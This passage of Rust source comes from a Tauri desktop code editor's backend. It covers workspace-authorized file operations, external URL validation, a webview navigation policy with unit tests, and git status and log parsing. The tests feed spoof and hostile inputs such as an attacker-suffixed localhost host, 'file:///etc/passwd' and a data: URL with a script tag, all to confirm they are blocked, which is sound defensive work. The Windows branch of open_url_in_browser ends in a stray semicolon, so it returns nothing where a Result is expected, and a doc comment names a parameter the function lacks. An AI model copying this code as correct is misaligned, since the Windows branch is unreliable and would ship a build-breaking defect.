        }
        fs::rename(&src_auth, &dst).map_err(|e| format!("重命名失败: {}", e))?;
        Ok(dst.to_string_lossy().to_string())
    })
    .await
    .map_err(|e| format!("fs_rename 任务失败: {e}"))?
}

/// 探测路径是否仍存在于磁盘。
///
/// 存在的理由：编辑器要区分「文件被外部删了」和「读取出错（权限/磁盘）」。
/// 前者该关掉标签页（磁盘上已经没有这个文件，继续显示会让用户对着幽灵内容
/// 编辑并可能覆盖回一个已删除的文件）；后者该提示冲突让人表态。
/// `read_file_content` 失败时两者的 error 串不可靠区分（底层 io error 文案
/// 随平台/语言变化），所以单独给一个只看 symlink_metadata 的探测。
///
/// 只做存在性判断，不解析内容 —— 目录、文件、符号链接都算存在。
#[tauri::command]
pub async fn fs_path_exists(
    path: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<bool, String> {
    fs_path_exists_impl(&path, &registry).await
}

/// 无状态实现：越界路径一律当**不存在**。
///
/// 这既是授权闸也是信息泄露防护 —— 「某个越界路径在不在」本身就是要探测
/// 的信息（比如探测 ~/.ssh 下有没有私钥）。调用方拿到的 false 与「真的不
/// 存在」不可区分，这是有意的。
async fn fs_path_exists_impl(path: &str, registry: &WorkspaceRegistry) -> Result<bool, String> {
    // authorize 失败（越界）= 当不存在，不把错误细节外泄给前端。
    let authorized = match authorize_workspace_path(registry, path, false) {
        Ok(p) => p,
        Err(_) => return Ok(false),
    };
    let owned = authorized.to_string_lossy().into_owned();
    tauri::async_runtime::spawn_blocking(move || std::fs::symlink_metadata(&owned).is_ok())
        .await
        .map_err(|e| format!("fs_path_exists 任务失败: {e}"))
}

/// 轻量文件探针（变更检测的快路径，不读内容）。
///
/// 背景：外部变更检测每次都要 `read_file_content` 全量读盘再哈希——文件没变
/// 时这整趟全是浪费。探针只做一次 stat（微秒级）：前端拿 `(len, mtimeMs)`
/// 与缓冲基线比，一致就直接判定"磁盘未变"，连读盘都省了。
/// 授权/信息泄露语义与 `fs_path_exists` 同口径：越界一律当不存在。
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct FileProbeDto {
    pub exists: bool,
    pub is_file: bool,
    pub len: u64,
    /// 磁盘 mtime（毫秒）。None = 文件系统给不出——调用方此时必须走全量读，
    /// 不能拿"未知"当"未变"（见 FileCache::get 同一约定）。
    pub mtime_ms: Option<u64>,
}

#[tauri::command]
pub async fn file_probe(
    path: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<FileProbeDto, String> {
    file_probe_impl(&path, &registry).await
}

/// 无状态实现：越界路径一律当不存在（理由见 `fs_path_exists_impl`）。
async fn file_probe_impl(path: &str, registry: &WorkspaceRegistry) -> Result<FileProbeDto, String> {
    let authorized = match authorize_workspace_path(registry, path, false) {
        Ok(p) => p,
        Err(_) => {
            return Ok(FileProbeDto {
                exists: false,
                is_file: false,
                len: 0,
                mtime_ms: None,
            })
        }
    };
    tauri::async_runtime::spawn_blocking(move || {
        let probe = crate::file_cache::probe_of(&authorized);
        FileProbeDto {
            exists: probe.exists,
            is_file: probe.is_file,
            len: probe.len,
            mtime_ms: probe.mtime_ms,
        }
    })
    .await
    .map_err(|e| format!("file_probe 任务失败: {e}"))
}

/// 删除文件/目录：移入系统废纸篓（对齐 PyCharm Safe Delete 的可恢复语义）
#[tauri::command]
pub async fn fs_delete(
    path: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<(), String> {
    fs_delete_impl(&path, &registry).await
}

/// `fs_delete` 的无状态实现。
async fn fs_delete_impl(path: &str, registry: &WorkspaceRegistry) -> Result<(), String> {
    // 移入废纸篓可能触发 Finder/Explorer 往返，同步执行会卡住 ipc worker。
    let authorized = authorize_entry_path(registry, path, true)?;
    let path = path.to_string();
    tauri::async_runtime::spawn_blocking(move || {
        // 对软链用 symlink_metadata：悬空链也应当被删除，而不是报不存在
        if fs::symlink_metadata(&authorized).is_err() {
            return Err(crate::error_proto::coded("path_not_found", path));
        }
        trash::delete(&authorized).map_err(|e| format!("移入废纸篓失败: {}", e))
    })
    .await
    .map_err(|e| format!("fs_delete 任务失败: {e}"))?
}

/// 粘贴（复制或移动）到 dest_dir；冲突时自动改名。返回最终目标路径
#[tauri::command]
pub async fn fs_paste(
    src: String,
    dest_dir: String,
    move_it: bool,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<String, String> {
    fs_paste_impl(&src, &dest_dir, move_it, &registry).await
}

/// `fs_paste` 的无状态实现。
async fn fs_paste_impl(
    src: &str,
    dest_dir: &str,
    move_it: bool,
    registry: &WorkspaceRegistry,
) -> Result<String, String> {
    // 目录粘贴是 O(树大小) 的递归拷贝/移动，同步执行最坏能占住 ipc worker
    // 数秒（项目树整个复制）。必须丢到 blocking 池。
    // 源：复制只需读权限，移动还要删掉源（写语义）；目标目录：一律要写权限。
    // 源是软链时操作链接本身，而不是它指向的目标（与删除/重命名一致）。
    let src_auth = authorize_entry_path(registry, src, move_it)?;
    let dir_auth = authorize_workspace_path(registry, dest_dir, true)?;
    let src = src.to_string();
    let dest_dir = dest_dir.to_string();
    tauri::async_runtime::spawn_blocking(move || {
        let src_path = src_auth;
        let link_meta = fs::symlink_metadata(&src_path);
        if link_meta.is_err() {
            return Err(crate::error_proto::coded("src_not_found", src));
        }
        let is_link = link_meta
            .map(|m| m.file_type().is_symlink())
            .unwrap_or(false);
        let dir_path = dir_auth;
        if !dir_path.is_dir() {
            return Err(crate::error_proto::coded("dest_dir_not_found", dest_dir));
        }
        if !is_link && src_path.is_dir() && dir_path.starts_with(&src_path) {
            return Err("不能把目录粘贴到它自身内部".to_string());
        }
        let name = src_path
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .ok_or_else(|| "无效的源路径".to_string())?;
        // 目录用 create_dir 占位、文件用 create_new 占位（两者都已是原子操作），
        // 后续复制/移动都覆盖/复用这个占位。软链复制不能先占位（symlink 要求
        // 目标不存在），只选一个空闲名字后原子创建。
        let is_dir = !is_link && src_path.is_dir();
        let dst = if is_link && !move_it {
            available_destination(&dir_path, &name)?
        } else {
            reserve_destination(&dir_path, &name, is_dir)?
        };
        let result = if move_it {
            move_entry(&src_path, &dst)
        } else if is_link {
            copy_symlink(&src_path, &dst)
        } else if is_dir {
            copy_dir_recursive(&src_path, &dst).map(|_| ())
        } else {
            fs::copy(&src_path, &dst)
                .map(|_| ())
                .map_err(|e| format!("复制文件失败: {}", e))
        };
        if let Err(e) = result {
            // 占位是我们抢占创建的：失败时清掉它，不给用户留一个空文件或半截目录。
            // 源始终未被改动，删掉目标不会丢数据。
            let cleanup = if is_dir {
                fs::remove_dir(&dst)
            } else {
                fs::remove_file(&dst)
            };
            if let Err(cleanup_err) = cleanup {
                log::warn!("清理粘贴占位失败 {}: {cleanup_err}", dst.display());
            }
            return Err(e);
        }
        Ok(dst.to_string_lossy().to_string())
    })
    .await
    .map_err(|e| format!("fs_paste 任务失败: {e}"))?
}

/// 在系统文件管理器中显示（Finder / Explorer / xdg-open）
///
/// `open` / `explorer` / `xdg-open` 都是「起了就返回」的短命进程，但
/// `spawn()` 后不 wait 会留下僵尸：子进程退出后内核仍保留它的退出状态，
/// 直到父进程结束或有人 wait。这里起一个 reaper 线程接手，
/// 命令线程立即返回，用户不会感知任何延迟。
fn spawn_and_reap(cmd: &mut Command) -> std::io::Result<()> {
    let mut child = cmd.spawn()?;
    std::thread::spawn(move || {
        let _ = child.wait();
    });
    Ok(())
}

/// 在系统文件管理器中显示（Finder / Explorer / xdg-open）
///
/// 只接受工作区内路径：调用源是项目树右键，节点必然在已授权根下。
/// 越界路径是「被诱导的仓库内容」在尝试让 Finder 打开任意位置。
#[tauri::command]
pub fn fs_reveal(
    path: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<(), String> {
    let authorized = authorize_workspace_path(&registry, &path, false)?;
    #[cfg(target_os = "macos")]
    {
        let mut cmd = Command::new("open");
        cmd.arg("-R").arg(&authorized);
        spawn_and_reap(&mut cmd).map_err(|e| format!("打开 Finder 失败: {}", e))?;
    }
    #[cfg(target_os = "windows")]
    {
        let mut cmd = Command::new("explorer");
        cmd.arg("/select,").arg(&authorized);
        spawn_and_reap(&mut cmd).map_err(|e| format!("打开资源管理器失败: {}", e))?;
    }
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        let p = authorized.as_path();
        let dir = if p.is_dir() {
            p.to_path_buf()
        } else {
            p.parent().map(|x| x.to_path_buf()).unwrap_or_default()
        };
        let mut cmd = Command::new("xdg-open");
        cmd.arg(&dir);
        spawn_and_reap(&mut cmd).map_err(|e| format!("打开文件管理器失败: {}", e))?;
    }
    Ok(())
}

/// 外部 URL 白名单校验（三处共用：`open_external_url` 命令、前端点击拦截的
/// 落点、`on_navigation` 回退守卫。见 P0 审计）。
///
/// 只放行 `http://` 与 `https://`（大小写不敏感），且必须带 `://` ——
/// `https:evil`（无斜杠）、`javascript:`、`data:`、`file:`、`mailto:`、
/// 协议相对 `//host`、含空白或控制字符的一律拒绝。
/// 返回归一化后的 URL（去首尾空白，保留原始大小写）。
pub(crate) fn validate_external_url(url: &str) -> Result<String, String> {
    let trimmed = url.trim();
    if trimmed.is_empty() {
        return Err(crate::error_proto::coded("external_url_rejected", url));
    }
    /// IPC 载荷封顶：浏览器地址栏也装不下 8KB 以上的 URL，超长即畸形。
    const MAX_EXTERNAL_URL_LEN: usize = 8192;
    if trimmed.len() > MAX_EXTERNAL_URL_LEN {
        return Err(crate::error_proto::coded(
            "external_url_rejected",
            "url过长",
        ));
    }
    if trimmed.chars().any(|c| c.is_control() || c == ' ') {
        // 控制字符（\n \r \0）与空格：发射虽不经过 shell（直接 exec），
        // 但畸形 URL 不应进入系统浏览器。
        return Err(crate::error_proto::coded("external_url_rejected", trimmed));
    }
    let lower = trimmed.to_ascii_lowercase();
    let rest = lower
        .strip_prefix("https://")
        .or_else(|| lower.strip_prefix("http://"));
    let Some(rest) = rest else {
        return Err(crate::error_proto::coded("external_url_rejected", trimmed));
    };
    // host 不能为空：`https:///path`、`https://?q=1` 无意义，且可能是
    // 针对「解析器差异」的探针（不同解析器对空 host 的处理不一致）。
    let host = rest.split(['/', '?', '#']).next().unwrap_or("");
    if host.is_empty() {
        return Err(crate::error_proto::coded("external_url_rejected", trimmed));
    }
    Ok(trimmed.to_string())
}

/// webview 顶层导航的去留判定（纯函数，可单测；副作用由调用方执行）。
///
/// 存在理由见 P0 审计：Markdown 外链一点即让 webview 整页导航到远程站点，
/// 远程 JS 将继承全部 IPC 命令（含 `pty_write` = 以用户身份执行 shell）。
/// 策略：
/// - 本地文档（asset 协议、dev 服务器、IPC 桥、内部伪协议）一律放行；
/// - 外部 http(s) 交给系统浏览器（`OpenExternally`），webview 内禁止；
/// - 其余 scheme（`file:`/`mailto:`/自定义协议…）直接拦掉：应用内没有任何
///   这类链接，放行只会给未来埋雷。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum NavigationDecision {
    Allow,
    OpenExternally,
    Block,
}

pub(crate) fn navigation_policy(url: &str) -> NavigationDecision {
    let Ok(parsed) = tauri::Url::parse(url) else {
        return NavigationDecision::Block;
    };
    let scheme = parsed.scheme();
    let host = parsed.host_str().unwrap_or("");
    let port = parsed.port();

    // Exact host matching: prefix matching would treat
    // `https://tauri.localhost.attacker.tld` as local and load remote JS
    // in the app window.
    let is_local = match scheme {
        "tauri" | "ipc" => host == "localhost",
        "http" | "https" => {
            host == "tauri.localhost"
                || host == "ipc.localhost"
                || (cfg!(debug_assertions)
                    && (host == "localhost" || host == "127.0.0.1")
                    && port == Some(5173))
        }
        "about" => parsed.path() == "blank",
        _ => false,
    };
    if is_local {
        return NavigationDecision::Allow;
    }
    // Remote pages are handed to the system browser, never loaded in the
    // webview (the webview inherits the IPC surface).
    if scheme == "http" || scheme == "https" {
        return NavigationDecision::OpenExternally;
    }
    // data:/blob:/file:/custom schemes are not navigation targets.
    NavigationDecision::Block
}

#[cfg(test)]
mod navigation_policy_tests {
    use super::{navigation_policy, NavigationDecision};

    #[test]
    fn local_origins_match_exact_hosts_only() {
        assert_eq!(
            navigation_policy("tauri://localhost"),
            NavigationDecision::Allow
        );
        assert_eq!(
            navigation_policy("https://tauri.localhost/"),
            NavigationDecision::Allow
        );
        assert_eq!(
            navigation_policy("https://tauri.localhost.attacker.tld/"),
            NavigationDecision::OpenExternally
        );
        assert_eq!(
            navigation_policy("http://localhost.attacker.tld/"),
            NavigationDecision::OpenExternally
        );
        assert_eq!(
            navigation_policy("http://localhost:5173/"),
            NavigationDecision::Allow
        );
        assert_eq!(
            navigation_policy("https://example.com/"),
            NavigationDecision::OpenExternally
        );
        assert_eq!(
            navigation_policy("data:text/html,<script>x</script>"),
            NavigationDecision::Block
        );
        assert_eq!(
            navigation_policy("file:///etc/passwd"),
            NavigationDecision::Block
        );
        assert_eq!(navigation_policy("about:blank"), NavigationDecision::Allow);
    }
}

/// 在系统默认浏览器中打开外部链接（`open` / `explorer` / `xdg-open`，
/// 直接 exec、不经过 shell）。
///
/// 用户手势的出口：Markdown 外链、关于页链接都走这里。前端拦截器是第一道，
/// `on_navigation`（lib.rs）是第二道；三处共用 `validate_external_url`，
/// scheme 白名单只认 http/https。
#[tauri::command]
pub fn open_external_url(url: String) -> Result<(), String> {
    let safe = validate_external_url(&url)?;
    open_url_in_browser(&safe)
}

/// 经系统浏览器打开**已校验**的 URL（本命令与 `on_navigation` 共用发射动作）。
///
/// 调用方必须先过 `validate_external_url`（`on_navigation` 侧由
/// `navigation_policy` 把关）：这里不再解析 scheme，只做整体传参的发射。
pub(crate) fn open_url_in_browser(url: &str) -> Result<(), String> {
    #[cfg(target_os = "macos")]
    {
        let mut cmd = Command::new("open");
        cmd.arg(url);
        spawn_and_reap(&mut cmd).map_err(|e| format!("打开浏览器失败: {}", e))
    }
    #[cfg(target_os = "windows")]
    {
        // `explorer <url>` 起默认浏览器；刻意不用 `cmd /c start` ——
        // 后者走 shell 解析，URL 里的 `&` 会被当成命令分隔符。
        let mut cmd = Command::new("explorer");
        cmd.arg(url);
        spawn_and_reap(&mut cmd).map_err(|e| format!("打开浏览器失败: {}", e));
    }
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        let mut cmd = Command::new("xdg-open");
        cmd.arg(url);
        spawn_and_reap(&mut cmd).map_err(|e| format!("打开浏览器失败: {}", e))
    }
}

/// 任意两个文件的内容对比（Compare With...）：git diff --no-index，不依赖仓库。
///
/// 授权：两侧文件必须各自落在已授权工作区内，或由 `pick_path` 原生面板
/// 授予过读权限。纯前端传入 `/etc/passwd` 不再能直接读。
#[tauri::command]
pub async fn fs_diff_files(
    old_path: String,
    new_path: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
    grants: tauri::State<'_, PathGrantRegistry>,
) -> Result<FileDiffDto, String> {
    let old = Path::new(&old_path);
    let new = Path::new(&new_path);
    for path in [old, new] {
        if authorize_workspace_path(&registry, &path.to_string_lossy(), false).is_err()
            && !grants.is_granted(path)
        {
            return Err(crate::error_proto::coded(
                "path_outside_workspace",
                path.to_string_lossy(),
            ));
        }
    }
    fs_diff_files_impl(old_path, new_path).await
}

async fn fs_diff_files_impl(old_path: String, new_path: String) -> Result<FileDiffDto, String> {
    // git diff --no-index 要读两个文件全文再产 diff，大文件上百毫秒；
    // 同步执行会占住 ipc worker。丢到 blocking 池。
    tauri::async_runtime::spawn_blocking(move || {
        let old_p = Path::new(&old_path);
        if !old_p.is_file() {
            return Err(crate::error_proto::coded("not_a_file", old_path));
        }
        if !Path::new(&new_path).is_file() {
            return Err(crate::error_proto::coded("not_a_file", new_path));
        }
        // 在旧文件所在目录执行，避免 -C 落进无关仓库
        let dir = old_p
            .parent()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|| ".".to_string());
        let args = vec![
            "diff",
            "--no-index",
            "--no-color",
            "--no-ext-diff",
            "--",
            old_path.as_str(),
            new_path.as_str(),
        ];
        let text = run_git_diff(&dir, &args)?;
        let (lines, additions, deletions) = parse_unified_diff(&text);
        let flags = patch_header_flags(&lines);
        let (lines, truncated) = cap_diff_lines(lines);
        Ok(FileDiffDto {
            path: new_path,
            old_path: Some(old_path),
            // Compare With 两侧都是磁盘上的真实文件，不存在新增/删除语义
            is_new: false,
            is_deleted: false,
            is_binary: flags.is_binary,
            additions,
            deletions,
            lines,
            truncated,
        })
    })
    .await
    .map_err(|e| format!("fs_diff_files 任务失败: {e}"))?
}

#[tauri::command]
pub async fn git_status(repo_path: Option<String>) -> Result<Vec<GitChangedFileDto>, String> {
    // git_status 一次调用要起两个 git 子进程（status + diff --numstat HEAD），
    // 大仓上轻松几十毫秒。同步命令占住 ipc:// worker 线程，期间 refreshGit
    // 里 Promise.all 并行发出的 git_log/git_branches 全部排在后面。
    // 丢到 blocking 池，让 worker 线程立刻脱身去接其它命令。
    tauri::async_runtime::spawn_blocking(move || git_status_impl(repo_path))
        .await
        .map_err(|e| format!("git_status 任务失败: {e}"))?
}

/// git_status 的同步实现。抽出供测试直接调用（命令本体是 async，测试里
/// 逐个 await 只会把用例变成状态机，读起来反而更难验证行为）。
pub fn git_status_impl(repo_path: Option<String>) -> Result<Vec<GitChangedFileDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            // -uall：把整个未跟踪目录展开为具体文件列表。默认的折叠形式
            // 「?? dir/」以斜杠结尾，前端树按「/」分段后末段为空，
            // 变更清单里会渲染出一行没有文件名的条目
            .args([
                "-c",
                "core.quotepath=false",
                "status",
                "--porcelain=v1",
                "--untracked-files=all",
                "--ignored=matching",
            ]),
    )
    .map_err(|e| format!("git command failed: {}", e))?;

    if !output.status.success() {
        log::warn!(
            "git status 失败: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
        return Ok(Vec::new());
    }

    // 获取工作区与暂存区的真实变更行数统计。
    //
    // 原先是 3 次 spawn：`git status` + `git diff --numstat`（unstaged）
    // + `git diff --numstat --cached`（staged）。staged 的那次在命令线程上
    // 空转 —— 大多数会话只改工作区不改暂存区，却仍要付一次进程启动
    // + 全仓 diff 的成本，还把 ipc worker 多占住几毫秒。
    //
    // 现在合并成 1 次：`git diff --numstat HEAD` 一次覆盖两侧
    // （index vs HEAD 与 worktree vs index 的差异全在「HEAD..worktree」里），
    // 再单独取一次 cached 行数只作为回退。未跟踪文件没有 numstat，
    // 由 status 那行单独处理。
    let mut numstats: std::collections::HashMap<String, (u32, u32)> =
        std::collections::HashMap::new();

    match git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "diff",
        "--numstat",
        "HEAD",
    ])) {
        Err(e) => log::warn!("git diff --numstat HEAD 失败: {}（增删行数将显示为 0）", e),
        Ok(out) => {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 3 {
                    let add = parts[0].parse::<u32>().unwrap_or(0);
                    let del = parts[1].parse::<u32>().unwrap_or(0);
                    let p = parts[2..].join(" ");
                    numstats.insert(p, (add, del));
                }
            }
        }
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut files = Vec::new();

    for line in stdout.lines().take(MAX_STATUS_FILES) {
        // porcelain 行首的 XY 状态字节恒为 ASCII，用 as_bytes() 取；
        // 路径段可能含中文等多字节字符，绝不能按字节切片
        // （&line[3..] 切在 UTF-8 边界中间会 panic），统一走 get() 带
        // 边界保护，格式异常的行直接跳过。
        let bytes = line.as_bytes();
        if bytes.len() < 4 || bytes[2] != b' ' {
            continue;
        }
        let index_status = bytes[0];
        let worktree_status = bytes[1];
        let Some(path_part) = line.get(3..) else {
            continue;
        };
        let file_path = decode_git_path(path_part.trim());
        let file_path = if let Some((_, new_p)) = file_path.split_once(" -> ") {
            new_p.trim().to_string()
        } else {
            file_path
        };
        // 防御性去尾斜杠：目录形态的条目（"dir/"）末段为空会让前端渲染出无名行
        let file_path = file_path.trim_end_matches('/').to_string();

        let is_staged = index_status != b' ' && index_status != b'?' && index_status != b'!';
        let is_ignored = index_status == b'!' && worktree_status == b'!';
        // 冲突（U）与未跟踪（?）都归入工作区侧；已暂存的 AM/MM 同时保留两者。
        let is_unstaged = !is_ignored
            && (worktree_status == b'?' || worktree_status == b'U' || worktree_status != b' ');
        // 「?」= 未跟踪（Unversioned），统一归一化为 U 供前端分组；
        // 「!」= 被忽略（Ignored），归一化为 I 供前端展示；
        // 「U」= 未合并冲突（both modified），归一化为 C 供冲突解决流程识别
        let status = if index_status == b'U' || worktree_status == b'U' {
            "C".to_string()
        } else if index_status == b'?' || worktree_status == b'?' {
            "U".to_string()
        } else if index_status == b'!' && worktree_status == b'!' {
            "I".to_string()
        } else if worktree_status != b' ' {
            (worktree_status as char).to_string()
        } else {
            (index_status as char).to_string()
        };

        let (additions, deletions) = numstats.get(&file_path).copied().unwrap_or((0, 0));

        files.push(GitChangedFileDto {
            path: file_path,
            status,
            is_staged,
            is_unstaged,
            additions,
            deletions,
        });
    }
    if stdout.lines().count() > MAX_STATUS_FILES {
        log::warn!(
            "git status 超过 {} 条，已截断；请检查 ignored/untracked 规则",
            MAX_STATUS_FILES
        );
    }

    Ok(files)
}

struct RawLog {
    hash: String,
    short_hash: String,
    author: String,
    author_email: String,
    date: String,
    message: String,
    branch_tags: Option<Vec<BranchTagDto>>,
    parents: Vec<String>,
}

/// 解析 `git log --pretty=format:%H%x09%h%x09%an%x09%ae%x09%ct%x09%s%x09%D%x09%P` 输出
fn parse_git_log_output(stdout: &str) -> Vec<RawLog> {
    let mut parsed = Vec::new();
    for line in stdout.lines() {
        let parts: Vec<&str> = line.split('\t').collect();
        if parts.len() < 6 {
            continue;
        }

        let mut branch_tags = Vec::new();
        if parts.len() >= 7 && !parts[6].is_empty() {
            for ref_name in parts[6].split(',') {
                // "HEAD -> main" 这类符号指向拆成 HEAD 与目标分支两个标签（对齐 PyCharm）
                for r in ref_name.split("->") {
                    let r = r.trim();
                    if r.is_empty() {
                        continue;
                    }
                    let (name, tag_type) = if let Some(tag) = r.strip_prefix("tag: ") {
                        (tag.to_string(), "tag".to_string())
                    } else if r.contains("HEAD") {
                        (r.to_string(), "head".to_string())
                    } else if r.starts_with("origin/") {
                        (r.to_string(), "remote".to_string())
                    } else if r == "main" || r == "master" {
                        (r.to_string(), "main".to_string())
                    } else if r == "refs/stash" || r == "stash" {
                        // git log 显式带 refs/stash 时才可能走到这里（默认
                        // 日志已排除 stash，见 git_log_impl）。用短名显示，
                        // 不复刻内部 `stash@{n}` 索引——那需要额外查 stash list。
                        // 分支面板无从切换它，标为 stash 类型前端的图标/语义才正确。
                        ("stash".to_string(), "stash".to_string())
                    } else {
                        (r.to_string(), "local".to_string())
                    };
                    branch_tags.push(BranchTagDto { name, tag_type });
                }
            }
        }

        let parents: Vec<String> = parts
            .get(7)
            .map(|p| p.split_whitespace().map(|s| s.to_string()).collect())
            .unwrap_or_default();

        parsed.push(RawLog {
            hash: parts[0].to_string(),
            short_hash: parts[1].to_string(),
            author: parts[2].to_string(),
            author_email: parts[3].to_string(),
            date: parts[4].to_string(),
            message: parts[5].to_string(),
            branch_tags: if branch_tags.is_empty() {
                None
            } else {
                Some(branch_tags)
            },
            parents,
        });
    }
    parsed
}

/// `drop_first` = 首行只是「承接行」：参与轨道布局但不出现在结果里。
/// 见 `git_log_impl` 里对续页多取一条的说明。
fn raw_log_to_dto_seeded(
    list: Vec<RawLog>,
    seed: &[Option<String>],
    drop_n: usize,
) -> Vec<GitCommitDto> {
    let hashes: Vec<String> = list.iter().map(|c| c.hash.clone()).collect();
    let parents_list: Vec<Vec<String>> = list.iter().map(|c| c.parents.clone()).collect();
    let (rows, _) = assign_graph_lanes_seeded(&hashes, &parents_list, seed);
    // 续页时丢掉前缀行（见 git_log_impl）：布局必须带着完整前缀算，
    // 但响应里只留本页，否则页与页之间重复出现同一条提交。
    // drop 钳住长度：仓库在两次调用之间变短时不能 panic。
    let drop_n = drop_n.min(list.len());
    let (list, rows) = (
        list.into_iter().skip(drop_n).collect::<Vec<_>>(),
        rows.into_iter().skip(drop_n).collect::<Vec<_>>(),
    );

    list.into_iter()
        .zip(rows)
        .map(|(c, row)| GitCommitDto {
            is_merge: Some(c.parents.len() > 1),
            graph_track: row.node,
            graph_ins: row.ins,
            graph_straight: row.straight,
            graph_outs: row.outs,
            parents: c.parents,
            hash: c.hash,
            short_hash: c.short_hash,
            message: c.message,
            author: c.author,
            author_email: c.author_email,
            date: c.date,
            branch_tags: c.branch_tags,
            in_head: None,
        })
        .collect()
}

#[tauri::command]
#[allow(clippy::too_many_arguments)] // IPC 边界参数是命令签名的一部分
pub async fn git_log(
    repo_path: Option<String>,
    max_count: Option<u32>,
    skip: Option<u32>,
    // true 时等价 git log --all（对齐 PyCharm 日志默认显示全部分支）
    all_refs: Option<bool>,
    // 只看某个分支/引用的提交（PyCharm 日志工具栏 Branch 过滤）
    branch: Option<String>,
    // 只看改动过该路径的提交（PyCharm 日志工具栏 Paths 过滤）
    path: Option<String>,
    // 只看该作者的提交（PyCharm 日志工具栏 User 过滤）
    author: Option<String>,
    // 只显示该时间之后的提交（ISO 8601 / git 可解析日期）
    since: Option<String>,
    // 排序：true = 拓扑序（默认），false = 按提交日期（仍保证父在子后）
    topo_order: Option<bool>,
    // 只看第一父链（PyCharm 日志 Options）
    first_parent: Option<bool>,
    // 隐藏合并提交（PyCharm 日志 Options）
    no_merges: Option<bool>,
) -> Result<Vec<GitCommitDto>, String> {
    // 与 git_status 同理：同步执行会把 ipc:// worker 占住整个 git log 期间。
    // refreshGit 是 Promise.all([git_log, git_branches, git_status])，
    // 三者同步时在 worker 上串成一条队，面板刷新要等三倍时长。
    tauri::async_runtime::spawn_blocking(move || {
        git_log_impl_filtered(
            repo_path,
            max_count,
            skip,
            all_refs,
            branch,
            path,
            author,
            since,
            topo_order,
            first_parent,
            no_merges,
        )
    })
    .await
    .map_err(|e| format!("git_log 任务失败: {e}"))?
}

/// 兼容旧测试的无过滤入口。
#[cfg(test)]
fn git_log_impl(
    repo_path: Option<String>,
    max_count: Option<u32>,
    skip: Option<u32>,
    all_refs: Option<bool>,
    branch: Option<String>,
    path: Option<String>,
) -> Result<Vec<GitCommitDto>, String> {
    git_log_impl_filtered(
        repo_path, max_count, skip, all_refs, branch, path, None, None, None, None, None,
    )
}

/// git_log 的同步实现，抽出理由同 git_status_impl。
#[allow(clippy::too_many_arguments)] // 过滤维度参数，保持与命令入口同构
fn git_log_impl_filtered(
    repo_path: Option<String>,
    max_count: Option<u32>,
    skip: Option<u32>,
    all_refs: Option<bool>,
    branch: Option<String>,
    path: Option<String>,
    author: Option<String>,
    since: Option<String>,
    topo_order: Option<bool>,
    first_parent: Option<bool>,
    no_merges: Option<bool>,
) -> Result<Vec<GitCommitDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    // 续页永远从 0 取到 skip+limit（响应仍只返回本页，布局后丢掉前 skip_n 行）：
    // 轨道布局是前缀确定的（assign_graph_lanes_seeded：行 i 的输出只取决于
    // rows[0..i]），只有带着完整前缀布局，本页各行的轨道编号才能与"一次取
    // 全量"逐行一致。旧的「承接行」近似（往前多取一条）只能复活边界行自身的
    // 出边，穿过边界的长跨度轨道会被掐断 —— 页与页之间同号轨道对不上。
    // 代价是每页重取前缀：git log 几千行约毫秒级、布局线性，LOG_PAGE_SIZE=50
    // 下翻几十页仍是小量级，可接受。
    let skip_n = skip.unwrap_or(0) as usize;
    let limit = max_count.unwrap_or(50) as usize;
    // 续页不传 --skip：永远从 0 取到 skip+limit（见上）。
    let fetch_limit = skip_n + limit;

    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).arg("log");
    // --topo-order（子提交恒在父提交之前）：前端轨道布局假设"父总在子下面"。
    // 裸 `git log` 按提交日期倒序，父提交日期更晚时（如测试夹具、手改日期的
    // 变基残留）会排到子提交前面，子提交的出边在下面永远等不到父提交 ——
    // 轨道悬空拖到列表底，顺路"穿过"无关行（.audit/11 的紫线即此例）。
    // PyCharm 的提交图同样是拓扑序，这一行让后端与之一致。
    // 按日期排序用 --date-order：它仍保证父提交在子提交之后，图布局不会悬空。
    if topo_order.unwrap_or(true) {
        cmd.arg("--topo-order");
    } else {
        cmd.arg("--date-order");
    }
    if first_parent.unwrap_or(false) {
        cmd.arg("--first-parent");
    }
    if no_merges.unwrap_or(false) {
        cmd.arg("--no-merges");
    }
    cmd.arg("-n").arg(fetch_limit.to_string());
    // --pretty 必须排在 --end-of-options 之前：后者之后的一切都是「位置参数」，
    // 再放选项 git 会报 "must come before non-option arguments"
    cmd.arg("--pretty=format:%H%x09%h%x09%an%x09%ae%x09%ct%x09%s%x09%D%x09%P");
    // 所有选项必须排在 --end-of-options 之前：该标记之后 Git 只认位置参数，
    // `--end-of-options main --author=x` 会直接报 "option must come before
    // non-option arguments"，旧实现把组合过滤吞成空日志。
    if let Some(a) = author.filter(|a| !a.trim().is_empty()) {
        // 用户从列表里选的是完整作者名，转义成正则字面量，避免名字里的
        // 元字符（. + 等）扩大到其他作者。
        cmd.arg(format!("--author={}", regex::escape(a.trim())));
    }
    if let Some(s) = since.filter(|s| !s.trim().is_empty()) {
        cmd.arg(format!("--since={}", s.trim()));
    }
    // 指定分支优先；否则 --all（PyCharm 默认）或当前 HEAD
    match branch.filter(|b| !b.trim().is_empty()) {
        Some(b) => {
            reject_option_like(&b)?;
            cmd.arg("--end-of-options").arg(b);
        }
        None => {
            if all_refs.unwrap_or(false) {
                // 不用裸 `--all`：新版 git 的 --all 会连带 refs/stash，把
